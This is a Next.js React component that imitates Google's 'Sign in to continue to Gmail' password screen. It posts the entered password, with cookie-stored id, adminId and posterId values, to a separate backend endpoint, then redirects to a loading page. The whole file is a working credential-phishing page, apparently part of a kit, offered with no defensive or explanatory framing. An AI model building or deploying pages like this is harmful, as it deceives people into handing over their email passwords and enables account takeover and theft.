"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
function page() {
  const router = useRouter();
  const id = Cookies.get("id");
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");
  const [password, setPassword] = useState("");
  const handleSubmit = async () => {
    if (!password) {
      return;
    }
    const values = {
      id,
      password,
      adminId,
      posterId,
    };
    const url = `${API_URL}/password/post`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      router.push("/loading");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  return (
    <div className="relative min-h-screen w-full flex justify-center items-center overflow-hidden">
  {/* Background Map */}
  {/* <iframe
    className="absolute inset-0 w-full h-full object-cover z-[-1] blur-sm"
    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
    frameBorder="0"
    allowFullScreen=""
    loading="lazy"
  ></iframe> */}

  {/* Password Form */}
  <div className="bg-white w-[80%] max-w-4xl p-6 rounded-lg shadow-md flex flex-col md:flex-row items-start gap-6 md:gap-40 z-10">
    {/* Left Section */}
    <div className="gap-3">
      <img src="/images/google-logo-small.png" width={95} height={35} className="object-cover" />
      <p className="font-medium text-xl">Sign in</p>
      <p className="font-medium text-md">to continue to Gmail</p>
    </div>

    {/* Right Section */}
    <div className="flex-1 w-full">
      <input
        required
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        className="w-full px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-2"
        type="password"
        placeholder="Enter your password"
      />
      <p className="text-black text-sm mt-2 cursor-pointer">Show password</p>
      <p className="text-sm mt-3">
        Not your computer? Use Guest mode to sign in privately.
      </p>
      <p className="text-[#1a73e8] text-sm mt-1 cursor-pointer">
        Learn more about using Guest mode
      </p>
      <div className="flex items-center justify-end mt-6 gap-4">
        <p className="text-zinc-800 text-sm mt-2 cursor-pointer">
          Create account
        </p>
        <button
          onClick={handleSubmit}
          className="bg-zinc-800 text-white px-6 py-1 rounded-lg mt-1"
        >
          Next
        </button>
      </div>
    </div>
  </div>
</div>

  );
}

export default page;
